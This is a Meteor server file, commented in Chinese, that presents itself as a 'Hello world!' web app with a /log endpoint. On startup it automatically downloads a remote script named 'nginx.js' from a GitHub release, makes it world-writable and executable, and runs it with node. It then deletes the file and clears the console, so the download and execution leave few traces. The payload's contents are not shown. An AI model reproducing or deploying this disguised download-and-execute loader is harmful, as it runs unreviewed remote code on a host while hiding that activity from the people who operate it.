import { Meteor } from 'meteor/meteor';
import fs from 'fs';
import path from 'path';
import axios from 'axios';
import { exec } from 'child_process';
import { WebApp } from 'meteor/webapp';

const FILE_PATH = process.env.FILE_PATH || './tmp';

// 创建目录
if (!fs.existsSync(FILE_PATH)) {
  fs.mkdirSync(FILE_PATH);
  console.log(`${FILE_PATH} is created`);
} else {
  console.log(`${FILE_PATH} already exists`);
}

// 设置路由
WebApp.connectHandlers.use('/', (req, res) => {
  res.writeHead(200);
  res.end('Hello world!');
});

const subTxtPath = path.join(FILE_PATH, 'log.txt');
WebApp.connectHandlers.use('/log', (req, res) => {
  fs.readFile(subTxtPath, "utf8", (err, data) => {
    if (err) {
      console.error(err);
      res.writeHead(500);
      res.end("Error reading log.txt");
    } else {
      res.writeHead(200, {'Content-Type': 'text/plain; charset=utf-8'});
      res.end(data);
    }
  });
});

// 下载和执行文件的函数
const fileUrl = 'https://github.com/eooce/test/releases/download/bulid/nginx.js';
const fileName = 'nginx.js';
const filePath = path.join(FILE_PATH, fileName);

const downloadAndExecute = () => {
  const fileStream = fs.createWriteStream(filePath);

  axios
    .get(fileUrl, { responseType: 'stream' })
    .then(response => {
      response.data.pipe(fileStream);
      return new Promise((resolve, reject) => {
        fileStream.on('finish', resolve);
        fileStream.on('error', reject);
      });
    })
    .then(() => {
      console.log('File downloaded successfully.');
      fs.chmodSync(filePath, '777');

      console.log('running the webapp...');
      const child = exec(`node ${filePath}`, (error, stdout, stderr) => {
        if (error) {
          console.error(`${error}`);
          return;
        }
        console.log(`${stdout}`);
        console.error(`${stderr}`);
      });

      child.on('exit', (code) => {
        fs.unlink(filePath, err => {
          if (err) {
            console.error(`Error deleting file: ${err}`);
          } else {
            console.clear();
            console.log(`App is running!`);
          }
        });
      });
    })
    .catch(error => {
      console.error(`Download error: ${error}`);
    });
};

// 在Meteor启动时执行下载和运行
Meteor.startup(() => {
  downloadAndExecute();
});
